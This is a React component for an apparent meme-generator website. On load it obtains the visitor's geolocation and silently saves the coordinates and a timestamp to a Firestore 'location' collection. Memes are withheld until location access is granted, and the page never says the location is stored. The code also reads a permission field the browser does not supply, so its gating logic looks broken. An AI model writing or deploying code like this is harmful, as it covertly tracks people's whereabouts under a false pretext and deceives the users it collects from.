import { useEffect, useState } from 'react';
import './App.css';
import { db } from './firebase-config';
import { MoonLoader } from 'react-spinners';
import { addDoc, collection } from 'firebase/firestore';

function App() {
  const [location, setLocation] = useState({});
  const [meme, setMeme] = useState(null);
  const [loading, setLoading] = useState(false);
  const [permission, setPermission] = useState('denied');

  const userCollectionRef = collection(db, 'location');

  const writeLocation = async () => {
    if (location?.latitude && location?.longitude) {
      await addDoc(userCollectionRef, {
        latitude: location?.latitude || 0,
        longitude: location?.longitude || 0,
        time: Date(),
      });
    }
  };

  useEffect(() => {
    navigator.geolocation.getCurrentPosition((loc) => {
      console.log('thiss  loc', loc);
      setPermission(loc.permission);
      setLocation({
        latitude: loc.coords.latitude,
        longitude: loc.coords.longitude,
      });
    });
  }, []);

  useEffect(() => {
    writeLocation();
  }, [location]);

  useEffect(() => {
    const fetchMeme = async () => {
      setLoading(true);
      const response = await fetch('https://meme-api.com/gimme');
      const data = await response.json();
      setMeme(data);
      setLoading(false);
    };
    fetchMeme();
  }, []);

  const handleClick = async () => {
    setLoading(true);
    const response = await fetch('https://meme-api.com/gimme');
    const data = await response.json();
    setMeme(data);
    setLoading(false);
  };

  return (
    <div className='App'>
      <header className='App-header'>
        <div
          style={{
            display: 'flex',
            flexDirection: 'column',
            height: '500px',
            justifyContent: 'space-between',
            position: 'relative',
          }}
        >
          {permission === 'granted' ? (
            <div>
              {meme && !loading ? (
                <img
                  src={meme.url}
                  alt={meme.name}
                  style={{
                    width: '300px',
                    maxHeight: '400px',
                    borderRadius: '5px',
                  }}
                />
              ) : (
                <MoonLoader
                  color={'#ffffff'}
                  loading={loading}
                  cssOverride={{}}
                  size={50}
                  aria-label='Loading Spinner'
                  data-testid='loader'
                />
              )}
            </div>
          ) : (
            <p>exit website, enter again and accept location</p>
          )}
          <button
            onClick={handleClick}
            className={'generate-button'}
          >
            Generate Meme
          </button>
        </div>
      </header>
    </div>
  );
}

export default App;
